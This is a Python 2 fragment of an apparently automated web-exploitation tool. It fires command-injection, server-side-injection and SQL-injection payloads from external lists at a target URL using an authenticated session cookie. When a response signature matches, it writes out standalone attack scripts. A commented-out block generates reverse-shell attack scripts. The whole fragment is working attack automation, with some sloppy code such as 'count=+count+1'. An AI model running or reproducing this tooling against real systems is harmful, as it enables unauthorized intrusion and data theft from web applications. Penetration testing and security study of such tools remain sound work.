# Generate exploitation script for command injection
count = 0
if command_inj_exploitable == "yes":
		for key, value in method_params.items():
			for y in commandExecExploitList:
					method_params[key] = y.replace("\n", "")
					#response = make_request(method, url, method_params)
					response = make_auth_request(method, url, method_params, COOKIE_HTTP_HEADER)
					print "\n[*]Searching for the correct exploit..."
					print "[*]Payload used: " + str(method_params)
					print "[*]Elasped Time: " + str(response.elapsed.total_seconds())
					print "[*]Response content length: " + str(response.headers['content-length'])
					print "[*]Response content: \n" + response.content
					count=+count+1
					if response.content.find("Linux") != -1: #Aim of logic is to execute uname -a.
						print "[*]Exploit found! Generating standalone attack script..."

						#Generate standalone exploit script to execute uname -a
					 	with open('command_injection'+str(method_params.keys())+str(count)+'.py', 'w') as exploitFile:
		 					if method == "POST":
		 						exploitFile.write('import urllib, urllib2, cookielib, requests\nurl = "'+ url +'"\n')
		 						exploitFile.write('response = requests.post("'+url+'",'+str(method_params)+')\n')
		 						exploitFile.write("print response.content")

		 					elif method == "GET":
		 						exploitFile.write('import urllib, urllib2, cookielib, requests\nurl = "'+ url +'"\n')
		 						exploitFile.write('response = requests.get("'+url+'",'+str(method_params)+')\n')
		 						exploitFile.write("print response.content")
						break

'''
# Tries to generate a compatible reverse shell. Manual intervention if necessary. Edit the file 'commandInjExploitRevShellPayloads' if needed.
for z in commandExecExploitRevShellList:
	for key, value in method_params.items():
		method_params[key] = z.replace("\n", "")
		count=+count+1
		print "[*]Exploit found! Generating standalone attack script (Command injection reverse shell)..."
	 	with open('command_injection_rev_shell'+str(method_params.keys())+str(count)+'.py', 'w') as exploitFile:
				if method == "POST":
					exploitFile.write('import urllib, urllib2, cookielib, requests\nurl = "'+ url +'"\n')
					exploitFile.write('response = requests.post("'+url+'",'+str(method_params).replace("\\'","'")+')\n')
					exploitFile.write("print response.content")

				elif method == "GET":
					exploitFile.write('import urllib, urllib2, cookielib, requests\nurl = "'+ url +'"\n')
					exploitFile.write('response = requests.get("'+url+'",'+str(method_params)+')\n')
					exploitFile.write("print response.content")'''

# Generate exploitable script for server side injection
count = 0
if server_side_exploitable == "yes":
	for key, value in method_params.items():
		for y in serverInjectExploitList:
			method_params[key] = y.replace("\n", "")
			#response = make_request(method, url, method_params)
			response = make_auth_request(method, url, method_params, COOKIE_HTTP_HEADER)
			print "\n[*]Searching for the correct exploit..."
			print "[*]Payload used: " + str(method_params)
			print "[*]Elasped Time: " + str(response.elapsed.total_seconds())
			print "[*]Response content length: " + str(response.headers['content-length'])
			print "[*]Response content: \n" + response.content

			count=+count+1

			if response.content.find("Linux") != -1: #Need to find a better logic, or change the value on the spot during assesment.
				print "[*]Exploit found! Generating standalone attack script..."
				with open('server_side_injection'+str(method_params.keys())+str(count)+'.py', 'w') as exploitFile:
					if method == "POST":
						exploitFile.write('import urllib, urllib2, cookielib, requests\nurl = "'+ url +'"\n')
						exploitFile.write('response = requests.post("'+url+'",'+str(method_params)+')\n')
						exploitFile.write("print response.content")
					elif method == "GET":
						exploitFile.write('import urllib, urllib2, cookielib, requests\nurl = "'+ url +'"\n')
						exploitFile.write('response = requests.get("'+url+'",'+str(method_params)+')\n')
						exploitFile.write("print response.content")
				exploited = "yes"
				break




count = 0
exploited = "no"
if sql_exploitable == "yes":
	for x in sqlExploitList:
		for key, value in method_params.items():
			if exploited == "no":
				method_params[key] = x.replace("\n", "")
				#response = make_request(method, url, method_params)
				response = make_auth_request(method, url, method_params, COOKIE_HTTP_HEADER)
				print "\n[*]Searching for the correct exploit..."
				print "[*]Payload used: " + str(method_params)
				print "[*]Elasped Time: " + str(response.elapsed.total_seconds())
				print "[*]Response content length: " + str(response.headers['content-length'])
				print "[*]Response content: \n" + response.content

				count=+count+1

				if response.content.find("5.7.21-0ubuntu") != -1: #Change detection logic of this when necessary
					print "[*]Exploit found! Generating standalone attack script..."
					with open('sql_injection'+str(method_params.keys())+str(count)+'.py', 'w') as exploitFile:
						if method == "POST":
							exploitFile.write('import urllib, urllib2, cookielib, requests\nurl = "'+ url +'"\n')
							exploitFile.write('response = requests.post("'+url+'",'+str(method_params)+')\n')
							exploitFile.write("print response.content")
						elif method == "GET":
							exploitFile.write('import urllib, urllib2, cookielib, requests\nurl = "'+ url +'"\n')
							exploitFile.write('response = requests.get("'+url+'",'+str(method_params)+')\n')
							exploitFile.write("print response.content")
					exploited = "yes"
					break